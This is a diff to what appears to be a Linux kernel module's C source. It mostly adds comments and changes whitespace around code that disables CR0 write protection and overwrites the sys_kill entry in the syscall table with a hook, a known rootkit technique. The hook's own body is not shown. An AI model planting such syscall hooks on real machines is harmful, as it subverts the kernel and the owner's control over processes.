@@ -18,6 +18,9 @@ static void cleanup_hooks(void); //overwrites syscall table with origional funct
 static void write_cr0_forced(unsigned long val); //overwrites the cr0
 static void set_memory_protection(bool val); //turns on memory protection
 
+/*===================*\
+sys_kill hook functions
+\*===================*/
 //function for the sys_kill hook
 ptregs_t orig_kill=(ptregs_t) 0; //origional kill
 static asmlinkage long hooked_kill(const struct pt_regs *regs); //hooked KILL_SIGNALS
@@ -40,6 +43,10 @@ static asmlinkage long hooked_kill(const struct pt_regs *regs){
 }
 
 
+
+/*==========*\
+core functions
+\*==========*/
 //stores the adress of the origional functions
 static int store(void){
   orig_kill = (ptregs_t) __sys_call_table[__NR_kill];
@@ -47,7 +54,7 @@ static int store(void){
   return 0;
 }
 
-
+//rewrites the cr0 value in the cpu
 static void write_cr0_forced(unsigned long val){
   unsigned long __force_order;
   //nasm code to rewrite cr0
@@ -58,7 +65,6 @@ static void write_cr0_forced(unsigned long val){
     //respect to writes, use dummy memory operand
     //"+m"(__force_order)
 }
-
 //edits write protection
 static void set_memory_protection(bool val){
   if (val){ //turn memory protection on
@@ -74,9 +80,6 @@ static void set_memory_protection(bool val){
   }
 }
 
-
-
-
 //hooks syscall
 static void setup_hooks(void){
   store(); //stores the origional functions
@@ -85,7 +88,6 @@ static void setup_hooks(void){
   __sys_call_table[__NR_kill] = (long unsigned int) &hooked_kill; //rewrites the adress of sys_kill to point to hooked_kill
   set_memory_protection(true); //enables memory protection in cr0
 }
-
 //sets the sys_call_table back to normal
 static void cleanup_hooks(void){
   set_memory_protection(false); //disables memory protection in cr0
